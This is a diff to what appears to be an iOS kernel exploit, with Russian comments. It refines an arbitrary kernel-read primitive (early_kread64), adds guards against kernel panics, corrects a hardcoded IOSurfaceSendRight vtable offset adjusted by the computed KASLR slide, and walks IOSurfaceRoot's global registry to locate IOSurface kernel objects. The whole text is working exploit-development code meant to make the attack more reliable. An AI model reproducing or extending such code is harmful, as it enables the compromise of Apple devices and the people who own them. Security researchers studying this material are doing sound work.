@@ -5855,6 +5855,10 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // для циклов). full: fast + inline qword с hi32==pfn32, lo32 1..8 в первых 0x400.
     BOOL (^surfFast)(uint64_t) = ^BOOL(uint64_t c) {
         if (!kpLooksLikeKernelPointer(c)) return NO;
+        // 1.9.152: page-edge guard — маленький объект у края 16K-страницы: чтение
+        // c+0x178/c+0x400 вылезает в соседнюю (возможно немапнутую) → data abort
+        // (вероятная причина ребута #2 на дампе fobj).
+        if ((uint32_t)(c & 0x3fff) + 0x180 > 0x4000) return NO;
         uint64_t ro = kp_untag_ptr(early_kread64(c + 0x178));
         if (!kpLooksLikeKernelPointer(ro)) return NO;
         uint64_t q = early_kread64(ro + 0x18);
@@ -5863,7 +5867,10 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     BOOL (^surfFull)(uint64_t) = ^BOOL(uint64_t c) {
         if (surfFast(c)) return YES;
         if (!kpLooksLikeKernelPointer(c)) return NO;
-        for (uint32_t o = 0; o + 8 <= 0x400; o += 8) {
+        uint32_t lim = 0x400;
+        uint32_t room = 0x4000 - (uint32_t)(c & 0x3fff);
+        if (room < lim) lim = room;
+        for (uint32_t o = 0; o + 8 <= lim; o += 8) {
             uint64_t q = early_kread64(c + o);
             if ((uint32_t)(q >> 32) == pfn32 && (uint32_t)q >= 1 && (uint32_t)q <= 8) return YES;
         }
@@ -5875,7 +5882,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         // с верификацией [X+0x10]==dstID (раунд 26: SendRight vt file 0x7eef568,
         // поле +0x18; RootUC 0x7eed8f0; Root 0x7eed2f8; surfaceID @ +0x10).
         uint64_t kslide = kconstant(base) - 0xfffffff007004000ULL;
-        uint64_t vtSendRight = 0xfffffff007eef568ULL + kslide;
+        uint64_t vtSendRight = 0xfffffff007eef4c8ULL + kslide;   // р.31: instance vtable IOSurfaceSendRight (0x7eef568 = metaclass dispatch, не то!)
         uint64_t vtRootUC    = 0xfffffff007eed8f0ULL + kslide;
         uint64_t vtRoot      = 0xfffffff007eed2f8ULL + kslide;
         // 1.9.146: ip_kobject ОРАКУЛ — оффсет не из статики, а с железа: резолвим
@@ -5914,20 +5921,26 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             return kpLooksLikeKernelPointer(kobj) ? kobj : (uint64_t)0;
         };
         uint64_t (^surfFromSendRight)(uint64_t) = ^uint64_t(uint64_t kobj) {
-            // 1.9.151: kobj = IOMachPort; +0x28 = fPort (ipc_port), +0x30 = fObject
-            // (раунд 30, PAC addrDiv disc 0xba96 — untag даёт верный VA). Скан:
-            // сам kobj, fObject, и поля обоих (0x100) — поверхность по surfFast.
+            // 1.9.152: fObject = IOSurfaceSendRight (р.31) — СНАЧАЛА verify vtable
+            // (0x7eef4c8), потом +0x18 = IOSurface* (verify surfFast/[surf+0x10]).
+            // Глубокие сканы только после vtable — crash-guard (ребут #2).
             if (surfFull(kobj)) return kobj;
             uint64_t fobj = kp_untag_ptr(early_kread64(kobj + 0x30));
-            uint64_t bases[2] = { kobj, fobj };
-            for (int b = 0; b < 2; b++) {
-                uint64_t base = bases[b];
-                if (!kpLooksLikeKernelPointer(base)) continue;
-                if (surfFast(base)) return base;
+            if (kpLooksLikeKernelPointer(fobj)) {
+                if (kp_untag_ptr(early_kread64(fobj)) == vtSendRight) {
+                    uint64_t surf = kp_untag_ptr(early_kread64(fobj + 0x18));
+                    if (surfFast(surf)) return surf;
+                    if (kpLooksLikeKernelPointer(surf) && (uint32_t)early_kread64(surf + 0x10) == dstID) return surf;
+                }
+                if (surfFast(fobj)) return fobj;
                 for (uint32_t o = 0; o + 8 <= 0x100; o += 8) {
-                    uint64_t c = kp_untag_ptr(early_kread64(base + o));
+                    uint64_t c = kp_untag_ptr(early_kread64(fobj + o));
                     if (surfFast(c)) return c;
                 }
+            }
+            for (uint32_t o = 0; o < 0x100; o += 8) {
+                uint64_t c = kp_untag_ptr(early_kread64(kobj + o));
+                if (surfFast(c)) return c;
             }
             return (uint64_t)0;
         };
@@ -5977,16 +5990,19 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                       (unsigned long long)fobjVt,
                       (unsigned long long)(fobjVt ? fobjVt - kslide : 0),
                       fobjVt == vtSendRight ? @" = SendRight!" : @""]);
-            if (kpLooksLikeKernelPointer(fobj)) {
-                for (uint32_t o = 0; o + 8 <= 0x100; o += 8) {
-                    uint64_t q = early_kread64(fobj + o);
-                    uint64_t u = kp_untag_ptr(q);
-                    if (!kpLooksLikeKernelPointer(u) && !q) continue;
-                    kpNote(r, [NSString stringWithFormat:@"    fobj+0x%02x: raw=%#018llx untag=%#018llx%@",
-                              o, (unsigned long long)q, (unsigned long long)u,
-                              kpLooksLikeKernelPointer(u)
-                                ? [NSString stringWithFormat:@" → [+0x10]=%#x surfFast=%d", (uint32_t)early_kread64(u + 0x10), (int)surfFast(u)] : @""]);
-                }
+            if (kpLooksLikeKernelPointer(fobj) && fobjVt == vtSendRight) {
+                // vtable сошёлся (р.31) — настоящий SendRight: +0x10=Root*, +0x18=IOSurface*
+                uint64_t ownerRt = kp_untag_ptr(early_kread64(fobj + 0x10));
+                uint64_t surf = kp_untag_ptr(early_kread64(fobj + 0x18));
+                kpNote(r, [NSString stringWithFormat:@"    SendRight ✓: owner(Root)=%#llx IOSurface=%#llx ([surf+0x10]=%#x ждём %u) surfFast=%d",
+                          (unsigned long long)ownerRt, (unsigned long long)surf,
+                          kpLooksLikeKernelPointer(surf) ? (uint32_t)early_kread64(surf + 0x10) : 0,
+                          dstID, (int)surfFast(surf)]);
+            } else if (kpLooksLikeKernelPointer(fobj)) {
+                // НЕ SendRight (или strip-промах на addrDiv) — глубокий дереф
+                // ЗАПРЕЩЁН: 0x100-дамп чужого объекта = data abort (ребут #2)
+                kpNote(r, [NSString stringWithFormat:@"    fObject vtable НЕ SendRight (raw30=%#llx) — глубокий дереф пропущен (crash-guard)",
+                          (unsigned long long)early_kread64(smpKobj + 0x30)]);
             }
             surfVA = surfFromSendRight(smpKobj);
             if (surfVA) kpNote(r, [NSString stringWithFormat:@"  ★ smp IOMachPort-хоп → IOSurface %#llx", (unsigned long long)surfVA]);
@@ -6272,6 +6288,32 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         kpNote(r, [NSString stringWithFormat:@"  IOSurfaceRoot: svc=0x%x wrap=%#llx rootVA(fObject)=%#llx taskVA=%#llx",
                   isvc, (unsigned long long)rootWrap, (unsigned long long)rootVA, (unsigned long long)taskVA]);
         if (isvc) IOObjectRelease(isvc);
+        if (rootVA) {
+            // 1.9.152 (раунд 31): UC+0xe8 = сам IOSurfaceRoot*; на Root:
+            // array @ +0xd0 (index=surfaceID), count @ +0xd8 — ГЛОБАЛЬНЫЙ реестр,
+            // per-client findClientByTask не нужен. verify [obj+0x10]==surfaceID.
+            uint64_t rcnt = early_kread64(rootVA + 0xd8);
+            uint64_t rarr = kp_untag_ptr(early_kread64(rootVA + 0xd0));
+            kpNote(r, [NSString stringWithFormat:@"  реестр Root: array=%#llx count=%llu (dstID=%u)",
+                      (unsigned long long)rarr, (unsigned long long)rcnt, dstID]);
+            if (kpLooksLikeKernelPointer(rarr) && rcnt > dstID && rcnt < 0x200000) {
+                uint64_t cand = kp_untag_ptr(early_kread64(rarr + (uint64_t)dstID * 8));
+                if (kpLooksLikeKernelPointer(cand)) {
+                    uint32_t cid = (uint32_t)early_kread64(cand + 0x10);
+                    kpNote(r, [NSString stringWithFormat:@"    cand=%#llx [+0x10]=%u (ждём %u) surfFast=%d",
+                              (unsigned long long)cand, cid, dstID, (int)surfFast(cand)]);
+                    if (cid == dstID || surfFast(cand)) {
+                        uint64_t ro = kp_untag_ptr(early_kread64(cand + 0x178));
+                        uint64_t rq = kpLooksLikeKernelPointer(ro) ? early_kread64(ro + 0x18) : 0;
+                        surfVA = cand;
+                        rangesVA = kpLooksLikeKernelPointer(ro) ? ro + 0x18 : 0;
+                        kpNote(r, [NSString stringWithFormat:@"  ★ реестр Root+0xd0: surfVA=%#llx rangeObj=%#llx rangesVA=%#llx (qword=%#018llx)",
+                                  (unsigned long long)surfVA, (unsigned long long)ro,
+                                  (unsigned long long)rangesVA, (unsigned long long)rq]);
+                    }
+                }
+            }
+        }
         if (rootVA && taskVA) {
             uint64_t clientVA = 0;
             // сначала кэш 2 слота
